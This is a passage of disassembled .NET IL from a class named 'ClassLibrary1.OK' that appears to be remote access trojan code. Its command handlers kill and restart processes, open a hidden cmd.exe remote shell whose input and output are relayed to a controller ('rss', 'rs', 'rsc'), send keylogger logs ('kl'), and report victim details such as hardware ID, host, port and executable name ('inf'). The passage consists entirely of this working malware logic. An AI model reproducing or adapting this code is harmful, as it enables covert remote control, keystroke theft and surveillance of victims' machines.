        IL_06fa:  stelem.ref
        IL_06fb:  nop
        IL_06fc:  ldloc.s    V_89
        IL_06fe:  ldc.i4.4
        IL_06ff:  ldstr      "Deleted "
        IL_0704:  stelem.ref
        IL_0705:  nop
        IL_0706:  ldloc.s    V_89
        IL_0708:  ldc.i4.5
        IL_0709:  ldloc.s    V_32
        IL_070b:  stelem.ref
        IL_070c:  nop
        IL_070d:  ldloc.s    V_89
        IL_070f:  call       string [mscorlib]System.String::Concat(string[])
        IL_0714:  call       bool ClassLibrary1.OK::Send(string)
        IL_0719:  pop
        IL_071a:  leave.s    IL_0787

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_071c:  dup
        IL_071d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0722:  stloc.s    V_38
        IL_0724:  nop
        IL_0725:  ldloc.s    V_38
        IL_0727:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_072c:  nop
        IL_072d:  ldloc.s    V_38
        IL_072f:  stloc.s    V_39
        IL_0731:  ldc.i4.5
        IL_0732:  newarr     [mscorlib]System.String
        IL_0737:  stloc.s    V_89
        IL_0739:  ldloc.s    V_89
        IL_073b:  ldc.i4.0
        IL_073c:  ldstr      "proc"
        IL_0741:  stelem.ref
        IL_0742:  nop
        IL_0743:  ldloc.s    V_89
        IL_0745:  ldc.i4.1
        IL_0746:  ldsfld     string ClassLibrary1.OK::Y
        IL_074b:  stelem.ref
        IL_074c:  nop
        IL_074d:  ldloc.s    V_89
        IL_074f:  ldc.i4.2
        IL_0750:  ldstr      "ER"
        IL_0755:  stelem.ref
        IL_0756:  nop
        IL_0757:  ldloc.s    V_89
        IL_0759:  ldc.i4.3
        IL_075a:  ldsfld     string ClassLibrary1.OK::Y
        IL_075f:  stelem.ref
        IL_0760:  nop
        IL_0761:  ldloc.s    V_89
        IL_0763:  ldc.i4.4
        IL_0764:  ldloc.s    V_39
        IL_0766:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_076b:  stelem.ref
        IL_076c:  nop
        IL_076d:  ldloc.s    V_89
        IL_076f:  call       string [mscorlib]System.String::Concat(string[])
        IL_0774:  call       bool ClassLibrary1.OK::Send(string)
        IL_0779:  pop
        IL_077a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_077f:  nop
        IL_0780:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0785:  leave.s    IL_0787

      }  // end handler
      IL_0787:  nop
      IL_0788:  ldloc.s    V_30
      IL_078a:  ldc.i4.1
      IL_078b:  add.ovf
      IL_078c:  stloc.s    V_30
      IL_078e:  nop
      IL_078f:  ldloc.s    V_30
      IL_0791:  ldloc.s    V_31
      IL_0793:  cgt
      IL_0795:  ldc.i4.0
      IL_0796:  ceq
      IL_0798:  stloc.s    V_110
      IL_079a:  ldloc.s    V_110
      IL_079c:  brtrue     IL_05e3

      IL_07a1:  nop
      IL_07a2:  br         IL_09ae

      IL_07a7:  br         IL_09ae

      IL_07ac:  nop
      IL_07ad:  ldloc.s    V_88
      IL_07af:  ldstr      "re"
      IL_07b4:  ldc.i4.0
      IL_07b5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07ba:  ldc.i4.0
      IL_07bb:  ceq
      IL_07bd:  stloc.s    V_110
      IL_07bf:  ldloc.s    V_110
      IL_07c1:  brfalse    IL_09ae

      IL_07c6:  nop
      IL_07c7:  ldloc.0
      IL_07c8:  ldlen
      IL_07c9:  conv.ovf.i4
      IL_07ca:  ldc.i4.1
      IL_07cb:  sub.ovf
      IL_07cc:  stloc.s    V_41
      IL_07ce:  ldc.i4.2
      IL_07cf:  stloc.s    V_40
      IL_07d1:  br         IL_0999

      IL_07d6:  nop
      .try
      {
        IL_07d7:  ldstr      ""
        IL_07dc:  stloc.s    V_43
        IL_07de:  ldloc.0
        IL_07df:  ldloc.s    V_40
        IL_07e1:  ldelem.ref
        IL_07e2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_07e7:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
        IL_07ec:  stloc.s    V_42
        IL_07ee:  nop
        .try
        {
          IL_07ef:  ldloc.s    V_42
          IL_07f1:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
          IL_07f6:  callvirt   instance class [System]System.Diagnostics.FileVersionInfo [System]System.Diagnostics.ProcessModule::get_FileVersionInfo()
          IL_07fb:  callvirt   instance string [System]System.Diagnostics.FileVersionInfo::get_FileName()
          IL_0800:  stloc.s    V_43
          IL_0802:  leave.s    IL_087c

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0804:  dup
          IL_0805:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_080a:  stloc.s    V_44
          IL_080c:  nop
          IL_080d:  ldloc.s    V_44
          IL_080f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0814:  nop
          IL_0815:  ldloc.s    V_44
          IL_0817:  stloc.s    V_45
          IL_0819:  nop
          .try
          {
            IL_081a:  ldloc.s    V_42
            IL_081c:  callvirt   instance class [System]System.Diagnostics.ProcessModule [System]System.Diagnostics.Process::get_MainModule()
            IL_0821:  callvirt   instance string [System]System.Diagnostics.ProcessModule::get_FileName()
            IL_0826:  stloc.s    V_43
            IL_0828:  leave.s    IL_086e

          }  // end .try
          catch [mscorlib]System.Exception 
          {
            IL_082a:  dup
            IL_082b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
            IL_0830:  stloc.s    V_47
            IL_0832:  nop
            IL_0833:  ldloc.s    V_47
            IL_0835:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
            IL_083a:  nop
            IL_083b:  ldloc.s    V_47
            IL_083d:  stloc.s    V_46
            IL_083f:  ldstr      "windir"
            IL_0844:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Environ(string)
            IL_0849:  ldstr      "\\system32\\"
            IL_084e:  ldloc.s    V_42
            IL_0850:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
            IL_0855:  ldstr      ".exe"
            IL_085a:  call       string [mscorlib]System.String::Concat(string,
                                                                        string,
                                                                        string,
                                                                        string)
            IL_085f:  stloc.s    V_43
            IL_0861:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
            IL_0866:  nop
            IL_0867:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
            IL_086c:  leave.s    IL_086e

          }  // end handler
          IL_086e:  nop
          IL_086f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0874:  nop
          IL_0875:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_087a:  leave.s    IL_087c

        }  // end handler
        IL_087c:  nop
        IL_087d:  ldloc.s    V_42
        IL_087f:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_0884:  nop
        IL_0885:  ldc.i4.5
        IL_0886:  newarr     [mscorlib]System.String
        IL_088b:  stloc.s    V_89
        IL_088d:  ldloc.s    V_89
        IL_088f:  ldc.i4.0
        IL_0890:  ldstr      "proc"
        IL_0895:  stelem.ref
        IL_0896:  nop
        IL_0897:  ldloc.s    V_89
        IL_0899:  ldc.i4.1
        IL_089a:  ldsfld     string ClassLibrary1.OK::Y
        IL_089f:  stelem.ref
        IL_08a0:  nop
        IL_08a1:  ldloc.s    V_89
        IL_08a3:  ldc.i4.2
        IL_08a4:  ldstr      "RM"
        IL_08a9:  stelem.ref
        IL_08aa:  nop
        IL_08ab:  ldloc.s    V_89
        IL_08ad:  ldc.i4.3
        IL_08ae:  ldsfld     string ClassLibrary1.OK::Y
        IL_08b3:  stelem.ref
        IL_08b4:  nop
        IL_08b5:  ldloc.s    V_89
        IL_08b7:  ldc.i4.4
        IL_08b8:  ldloc.0
        IL_08b9:  ldloc.s    V_40
        IL_08bb:  ldelem.ref
        IL_08bc:  stelem.ref
        IL_08bd:  nop
        IL_08be:  ldloc.s    V_89
        IL_08c0:  call       string [mscorlib]System.String::Concat(string[])
        IL_08c5:  call       bool ClassLibrary1.OK::Send(string)
        IL_08ca:  pop
        IL_08cb:  ldnull
        IL_08cc:  stloc.s    V_42
        IL_08ce:  ldloc.s    V_43
        IL_08d0:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_08d5:  pop
        IL_08d6:  ldc.i4.6
        IL_08d7:  newarr     [mscorlib]System.String
        IL_08dc:  stloc.s    V_89
        IL_08de:  ldloc.s    V_89
        IL_08e0:  ldc.i4.0
        IL_08e1:  ldstr      "proc"
        IL_08e6:  stelem.ref
        IL_08e7:  nop
        IL_08e8:  ldloc.s    V_89
        IL_08ea:  ldc.i4.1
        IL_08eb:  ldsfld     string ClassLibrary1.OK::Y
        IL_08f0:  stelem.ref
        IL_08f1:  nop
        IL_08f2:  ldloc.s    V_89
        IL_08f4:  ldc.i4.2
        IL_08f5:  ldstr      "ER"
        IL_08fa:  stelem.ref
        IL_08fb:  nop
        IL_08fc:  ldloc.s    V_89
        IL_08fe:  ldc.i4.3
        IL_08ff:  ldsfld     string ClassLibrary1.OK::Y
        IL_0904:  stelem.ref
        IL_0905:  nop
        IL_0906:  ldloc.s    V_89
        IL_0908:  ldc.i4.4
        IL_0909:  ldstr      "Started "
        IL_090e:  stelem.ref
        IL_090f:  nop
        IL_0910:  ldloc.s    V_89
        IL_0912:  ldc.i4.5
        IL_0913:  ldloc.s    V_43
        IL_0915:  stelem.ref
        IL_0916:  nop
        IL_0917:  ldloc.s    V_89
        IL_0919:  call       string [mscorlib]System.String::Concat(string[])
        IL_091e:  call       bool ClassLibrary1.OK::Send(string)
        IL_0923:  pop
        IL_0924:  leave.s    IL_0991

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0926:  dup
        IL_0927:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_092c:  stloc.s    V_49
        IL_092e:  nop
        IL_092f:  ldloc.s    V_49
        IL_0931:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0936:  nop
        IL_0937:  ldloc.s    V_49
        IL_0939:  stloc.s    V_48
        IL_093b:  ldc.i4.5
        IL_093c:  newarr     [mscorlib]System.String
        IL_0941:  stloc.s    V_89
        IL_0943:  ldloc.s    V_89
        IL_0945:  ldc.i4.0
        IL_0946:  ldstr      "proc"
        IL_094b:  stelem.ref
        IL_094c:  nop
        IL_094d:  ldloc.s    V_89
        IL_094f:  ldc.i4.1
        IL_0950:  ldsfld     string ClassLibrary1.OK::Y
        IL_0955:  stelem.ref
        IL_0956:  nop
        IL_0957:  ldloc.s    V_89
        IL_0959:  ldc.i4.2
        IL_095a:  ldstr      "ER"
        IL_095f:  stelem.ref
        IL_0960:  nop
        IL_0961:  ldloc.s    V_89
        IL_0963:  ldc.i4.3
        IL_0964:  ldsfld     string ClassLibrary1.OK::Y
        IL_0969:  stelem.ref
        IL_096a:  nop
        IL_096b:  ldloc.s    V_89
        IL_096d:  ldc.i4.4
        IL_096e:  ldloc.s    V_48
        IL_0970:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0975:  stelem.ref
        IL_0976:  nop
        IL_0977:  ldloc.s    V_89
        IL_0979:  call       string [mscorlib]System.String::Concat(string[])
        IL_097e:  call       bool ClassLibrary1.OK::Send(string)
        IL_0983:  pop
        IL_0984:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0989:  nop
        IL_098a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_098f:  leave.s    IL_0991

      }  // end handler
      IL_0991:  nop
      IL_0992:  ldloc.s    V_40
      IL_0994:  ldc.i4.1
      IL_0995:  add.ovf
      IL_0996:  stloc.s    V_40
      IL_0998:  nop
      IL_0999:  ldloc.s    V_40
      IL_099b:  ldloc.s    V_41
      IL_099d:  cgt
      IL_099f:  ldc.i4.0
      IL_09a0:  ceq
      IL_09a2:  stloc.s    V_110
      IL_09a4:  ldloc.s    V_110
      IL_09a6:  brtrue     IL_07d6

      IL_09ab:  nop
      IL_09ac:  br.s       IL_09ae

      IL_09ae:  nop
      IL_09af:  nop
      IL_09b0:  leave      IL_1bd2

      IL_09b5:  nop
      IL_09b6:  ldloc.s    V_9
      IL_09b8:  ldstr      "rss"
      IL_09bd:  ldc.i4.0
      IL_09be:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_09c3:  ldc.i4.0
      IL_09c4:  ceq
      IL_09c6:  stloc.s    V_110
      IL_09c8:  ldloc.s    V_110
      IL_09ca:  brfalse    IL_0b08

      IL_09cf:  nop
      .try
      {
        IL_09d0:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
        IL_09d5:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_09da:  nop
        IL_09db:  leave.s    IL_09ff

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_09dd:  dup
        IL_09de:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_09e3:  stloc.s    V_51
        IL_09e5:  nop
        IL_09e6:  ldloc.s    V_51
        IL_09e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_09ed:  nop
        IL_09ee:  ldloc.s    V_51
        IL_09f0:  stloc.s    V_50
        IL_09f2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_09f7:  nop
        IL_09f8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_09fd:  leave.s    IL_09ff

      }  // end handler
      IL_09ff:  nop
      IL_0a00:  newobj     instance void [System]System.Diagnostics.Process::.ctor()
      IL_0a05:  stsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0a0a:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0a0f:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0a14:  ldc.i4.1
      IL_0a15:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_RedirectStandardOutput(bool)
      IL_0a1a:  nop
      IL_0a1b:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0a20:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0a25:  ldc.i4.1
      IL_0a26:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_RedirectStandardInput(bool)
      IL_0a2b:  nop
      IL_0a2c:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0a31:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0a36:  ldc.i4.1
      IL_0a37:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_RedirectStandardError(bool)
      IL_0a3c:  nop
      IL_0a3d:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0a42:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0a47:  ldstr      "cmd.exe"
      IL_0a4c:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
      IL_0a51:  nop
      IL_0a52:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0a57:  ldnull
      IL_0a58:  ldftn      void ClassLibrary1.OK::RS(object,
                                                     object)
      IL_0a5e:  newobj     instance void [System]System.Diagnostics.DataReceivedEventHandler::.ctor(object,
                                                                                                    native int)
      IL_0a63:  callvirt   instance void [System]System.Diagnostics.Process::add_OutputDataReceived(class [System]System.Diagnostics.DataReceivedEventHandler)
      IL_0a68:  nop
      IL_0a69:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0a6e:  ldnull
      IL_0a6f:  ldftn      void ClassLibrary1.OK::RS(object,
                                                     object)
      IL_0a75:  newobj     instance void [System]System.Diagnostics.DataReceivedEventHandler::.ctor(object,
                                                                                                    native int)
      IL_0a7a:  callvirt   instance void [System]System.Diagnostics.Process::add_ErrorDataReceived(class [System]System.Diagnostics.DataReceivedEventHandler)
      IL_0a7f:  nop
      IL_0a80:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0a85:  ldnull
      IL_0a86:  ldftn      void ClassLibrary1.OK::_Lambda__2(object,
                                                             class [mscorlib]System.EventArgs)
      IL_0a8c:  newobj     instance void [mscorlib]System.EventHandler::.ctor(object,
                                                                              native int)
      IL_0a91:  callvirt   instance void [System]System.Diagnostics.Process::add_Exited(class [mscorlib]System.EventHandler)
      IL_0a96:  nop
      IL_0a97:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0a9c:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0aa1:  ldc.i4.0
      IL_0aa2:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_UseShellExecute(bool)
      IL_0aa7:  nop
      IL_0aa8:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0aad:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0ab2:  ldc.i4.1
      IL_0ab3:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_CreateNoWindow(bool)
      IL_0ab8:  nop
      IL_0ab9:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0abe:  callvirt   instance class [System]System.Diagnostics.ProcessStartInfo [System]System.Diagnostics.Process::get_StartInfo()
      IL_0ac3:  ldc.i4.1
      IL_0ac4:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WindowStyle(valuetype [System]System.Diagnostics.ProcessWindowStyle)
      IL_0ac9:  nop
      IL_0aca:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0acf:  ldc.i4.1
      IL_0ad0:  callvirt   instance void [System]System.Diagnostics.Process::set_EnableRaisingEvents(bool)
      IL_0ad5:  nop
      IL_0ad6:  ldstr      "rss"
      IL_0adb:  call       bool ClassLibrary1.OK::Send(string)
      IL_0ae0:  pop
      IL_0ae1:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0ae6:  callvirt   instance bool [System]System.Diagnostics.Process::Start()
      IL_0aeb:  pop
      IL_0aec:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0af1:  callvirt   instance void [System]System.Diagnostics.Process::BeginErrorReadLine()
      IL_0af6:  nop
      IL_0af7:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0afc:  callvirt   instance void [System]System.Diagnostics.Process::BeginOutputReadLine()
      IL_0b01:  nop
      IL_0b02:  nop
      IL_0b03:  leave      IL_1bd2

      IL_0b08:  nop
      IL_0b09:  ldloc.s    V_9
      IL_0b0b:  ldstr      "rs"
      IL_0b10:  ldc.i4.0
      IL_0b11:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b16:  ldc.i4.0
      IL_0b17:  ceq
      IL_0b19:  stloc.s    V_110
      IL_0b1b:  ldloc.s    V_110
      IL_0b1d:  brfalse.s  IL_0b41

      IL_0b1f:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0b24:  callvirt   instance class [mscorlib]System.IO.StreamWriter [System]System.Diagnostics.Process::get_StandardInput()
      IL_0b29:  ldloc.0
      IL_0b2a:  ldc.i4.1
      IL_0b2b:  ldelema    [mscorlib]System.String
      IL_0b30:  call       string ClassLibrary1.OK::DEB(string&)
      IL_0b35:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0b3a:  nop
      IL_0b3b:  nop
      IL_0b3c:  leave      IL_1bd2

      IL_0b41:  nop
      IL_0b42:  ldloc.s    V_9
      IL_0b44:  ldstr      "rsc"
      IL_0b49:  ldc.i4.0
      IL_0b4a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b4f:  ldc.i4.0
      IL_0b50:  ceq
      IL_0b52:  stloc.s    V_110
      IL_0b54:  ldloc.s    V_110
      IL_0b56:  brfalse.s  IL_0b95

      IL_0b58:  nop
      .try
      {
        IL_0b59:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
        IL_0b5e:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
        IL_0b63:  nop
        IL_0b64:  leave.s    IL_0b88

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0b66:  dup
        IL_0b67:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0b6c:  stloc.s    V_53
        IL_0b6e:  nop
        IL_0b6f:  ldloc.s    V_53
        IL_0b71:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0b76:  nop
        IL_0b77:  ldloc.s    V_53
        IL_0b79:  stloc.s    V_52
        IL_0b7b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0b80:  nop
        IL_0b81:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0b86:  leave.s    IL_0b88

      }  // end handler
      IL_0b88:  nop
      IL_0b89:  ldnull
      IL_0b8a:  stsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
      IL_0b8f:  nop
      IL_0b90:  leave      IL_1bd2

      IL_0b95:  nop
      IL_0b96:  ldloc.s    V_9
      IL_0b98:  ldstr      "kl"
      IL_0b9d:  ldc.i4.0
      IL_0b9e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0ba3:  ldc.i4.0
      IL_0ba4:  ceq
      IL_0ba6:  stloc.s    V_110
      IL_0ba8:  ldloc.s    V_110
      IL_0baa:  brfalse.s  IL_0bd6

      IL_0bac:  ldstr      "kl"
      IL_0bb1:  ldsfld     string ClassLibrary1.OK::Y
      IL_0bb6:  ldsfld     class ClassLibrary1.kl ClassLibrary1.OK::kq
      IL_0bbb:  ldflda     string ClassLibrary1.kl::Logs
      IL_0bc0:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0bc5:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0bca:  call       bool ClassLibrary1.OK::Send(string)
      IL_0bcf:  pop
      IL_0bd0:  nop
      IL_0bd1:  leave      IL_1bd2

      IL_0bd6:  nop
      IL_0bd7:  ldloc.s    V_9
      IL_0bd9:  ldstr      "inf"
      IL_0bde:  ldc.i4.0
      IL_0bdf:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0be4:  ldc.i4.0
      IL_0be5:  ceq
      IL_0be7:  stloc.s    V_110
      IL_0be9:  ldloc.s    V_110
      IL_0beb:  brfalse    IL_0d21

      IL_0bf0:  ldstr      "inf"
      IL_0bf5:  ldsfld     string ClassLibrary1.OK::Y
      IL_0bfa:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0bff:  stloc.s    V_54
      IL_0c01:  ldstr      "vn"
      IL_0c06:  call       string ClassLibrary1.OK::GTV(string)
      IL_0c0b:  ldstr      ""
      IL_0c10:  ldc.i4.0
      IL_0c11:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c16:  ldc.i4.0
      IL_0c17:  ceq
      IL_0c19:  stloc.s    V_110
      IL_0c1b:  ldloc.s    V_110
      IL_0c1d:  brfalse.s  IL_0c51

      IL_0c1f:  ldloc.s    V_54
      IL_0c21:  ldsflda    string ClassLibrary1.OK::VN
      IL_0c26:  call       string ClassLibrary1.OK::DEB(string&)
      IL_0c2b:  ldstr      "_"
      IL_0c30:  call       string ClassLibrary1.OK::HWD()
      IL_0c35:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0c3a:  stloc.s    V_92
      IL_0c3c:  ldloca.s   V_92
      IL_0c3e:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0c43:  ldsfld     string ClassLibrary1.OK::Y
      IL_0c48:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0c4d:  stloc.s    V_54
      IL_0c4f:  br.s       IL_0c8b

      IL_0c51:  nop
      IL_0c52:  ldloc.s    V_54
      IL_0c54:  ldstr      "vn"
      IL_0c59:  call       string ClassLibrary1.OK::GTV(string)
      IL_0c5e:  stloc.s    V_92
      IL_0c60:  ldloca.s   V_92
      IL_0c62:  call       string ClassLibrary1.OK::DEB(string&)
      IL_0c67:  ldstr      "_"
      IL_0c6c:  call       string ClassLibrary1.OK::HWD()
      IL_0c71:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0c76:  stloc.s    V_93
      IL_0c78:  ldloca.s   V_93
      IL_0c7a:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0c7f:  ldsfld     string ClassLibrary1.OK::Y
      IL_0c84:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0c89:  stloc.s    V_54
      IL_0c8b:  nop
      IL_0c8c:  ldc.i4.6
      IL_0c8d:  newarr     [mscorlib]System.String
      IL_0c92:  stloc.s    V_94
      IL_0c94:  ldloc.s    V_94
      IL_0c96:  ldc.i4.0
      IL_0c97:  ldc.i4.5
      IL_0c98:  newarr     [mscorlib]System.String
      IL_0c9d:  stloc.s    V_89
      IL_0c9f:  ldloc.s    V_89
      IL_0ca1:  ldc.i4.0
      IL_0ca2:  ldloc.s    V_54
      IL_0ca4:  stelem.ref
      IL_0ca5:  nop
      IL_0ca6:  ldloc.s    V_89
      IL_0ca8:  ldc.i4.1
      IL_0ca9:  ldsfld     string ClassLibrary1.OK::H
      IL_0cae:  stelem.ref
      IL_0caf:  nop
      IL_0cb0:  ldloc.s    V_89
      IL_0cb2:  ldc.i4.2
      IL_0cb3:  ldstr      ":"
      IL_0cb8:  stelem.ref
      IL_0cb9:  nop
      IL_0cba:  ldloc.s    V_89
      IL_0cbc:  ldc.i4.3
      IL_0cbd:  ldsfld     string ClassLibrary1.OK::P
      IL_0cc2:  stelem.ref
      IL_0cc3:  nop
      IL_0cc4:  ldloc.s    V_89
      IL_0cc6:  ldc.i4.4
      IL_0cc7:  ldsfld     string ClassLibrary1.OK::Y
      IL_0ccc:  stelem.ref
      IL_0ccd:  nop
      IL_0cce:  ldloc.s    V_89
      IL_0cd0:  call       string [mscorlib]System.String::Concat(string[])
      IL_0cd5:  stelem.ref
      IL_0cd6:  nop
      IL_0cd7:  ldloc.s    V_94
      IL_0cd9:  ldc.i4.1
      IL_0cda:  ldsfld     string ClassLibrary1.OK::DR
      IL_0cdf:  stelem.ref
      IL_0ce0:  nop
      IL_0ce1:  ldloc.s    V_94
      IL_0ce3:  ldc.i4.2
      IL_0ce4:  ldsfld     string ClassLibrary1.OK::Y
      IL_0ce9:  stelem.ref
      IL_0cea:  nop
      IL_0ceb:  ldloc.s    V_94
      IL_0ced:  ldc.i4.3
      IL_0cee:  ldsfld     string ClassLibrary1.OK::EXE
      IL_0cf3:  stelem.ref
      IL_0cf4:  nop
      IL_0cf5:  ldloc.s    V_94
      IL_0cf7:  ldc.i4.4
      IL_0cf8:  ldsfld     string ClassLibrary1.OK::Y
      IL_0cfd:  stelem.ref
      IL_0cfe:  nop
      IL_0cff:  ldloc.s    V_94
      IL_0d01:  ldc.i4.5
      IL_0d02:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0d07:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
      IL_0d0c:  stelem.ref
      IL_0d0d:  nop
      IL_0d0e:  ldloc.s    V_94
